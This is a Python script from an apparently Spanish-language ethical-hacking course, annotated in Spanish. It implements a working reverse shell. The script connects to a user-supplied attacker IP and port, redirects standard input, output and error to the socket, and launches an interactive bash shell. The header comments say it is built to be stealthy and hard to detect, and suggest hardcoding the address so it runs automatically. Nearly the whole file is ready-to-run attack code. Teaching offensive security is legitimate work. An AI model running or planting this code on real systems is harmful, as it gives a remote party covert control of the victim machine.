#*********************************************************************************************************************************
#Curso "Python para hacking ético" Tknika 2022/2023
#RESUMEN DEL SCRIPT:
#Realizamos una reverse shell contra la IP introducida por el usuario. Se trata de que la máquina víctima envíe a la atacante los
#flujos de E/S y error que nos permitan ejecutar comandos en aquella. Es decir, se trata de obtener el control de la máquina víctima
#para poder realizar acciones en ella. Existen herramientas externas que efectúan reverse shell-s de manera sencilla,
#pero este script no las utiliza, sino que trata de crear procedimientos que sean más difíciles de detectar, más sigilosos,
#utilizando módulos propios del SDK de Python, los que están disponibles en el propio lenguaje.
#Este script se ha preparado de manera completa para que el usuario que lo ejecute tenga que introducir tanto la IP de la máquina
#atacante como el puerto en el que ésta está eschucando. En muchas ocasiones, en aras de que la ejecución del fichero se haga de 
#la manera más automática posible, será conveniente crear un script más simple que no pida la información como entrada, sino que
#utilice directamente la IP y puerto que nosotros decidamos.
#Consideraremos como máquina "servidor" a la atacante (la que activa el listener a la espera de conexiones).
#*********************************************************************************************************************************


import  socket, ipaddress, os, subprocess
#Función que comprueba si un valor es una IP válida; si no lo es, comprueba si es un nombre de host válido. 
def validar_destino(destino):
    try:
        ipaddress.ip_address(destino)
        return True
    except ValueError:
        try:
            socket.gethostbyname(destino)
            return True
        except socket.error:
            return False

#Función que comprueba si un valor es un puerto válido: está vacío (puerto por defecto) o está entre 1 y 65535
def validar_puerto(puerto):
    try:
        puerto = int(puerto)
        if 1 <= puerto <= 65535:
            return True
        else:
            return False
    except ValueError:
        return False

#Función para pedir los datos de entrada al usuario. Los valida, y, si son correctos, los devuelve. 
def solicitar_datos_usuario():
    destino_correcto=False
    puerto_correcto=False
    while not destino_correcto:
        destino = input('>> Introduce la dirección del host al que conectarte (IP o nombre de host): ')
        if validar_destino(destino):
            destino_correcto=True
    while not puerto_correcto:
        puerto = input('>> Introduce el puerto al que quieres conectarte, entre 1 y 65535: ')
        if validar_puerto(puerto):
            puerto_correcto=True
    return destino, puerto


if __name__ == "__main__":
    #Solicitamos los datos de entrada al usuario, y los recogemos en las variables "ip" y "puerto_listener"
    ip,puerto_listener=solicitar_datos_usuario()
    #Creamos un objeto de socket() de la librería socket
    #Argumentos:
    #socket.AF_INET: con esto indicamos que se usará el protocolo Internet
    #socket.sock_stream: se usará un socket de flujo, TCP. 
    servidor_atacante=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #Efectuamos la conexión 
    servidor_atacante.connect ((ip, int(puerto_listener)))
    #En sistemas GNU/Linux, la función dup() es una llamada al sistema que se utiliza para duplicar un descriptor de archivo, que es 
    #es un identificador numérico que el sistema operativo utiliza para hacer referencia a un archivo abierto, un socket o cualquier otro recurso de E/S.
    #Utilizamos la función dup2 para duplicar la entrada (0), salida  (1) y error (2) al descriptor de archivo del socket que tenemos abierto (usamos el 
    #método fileno para ello). Gracias a todo ello, podremos ejecutar comandos en el equipo de destino. 
    os.dup2(servidor_atacante.fileno(),0)
    os.dup2(servidor_atacante.fileno(),1)
    os.dup2(servidor_atacante.fileno(),2)
    #Ejecutamos una instancia interactiva de la shell de bash. 
    p=subprocess.call(["/bin/bash","-i"])
    
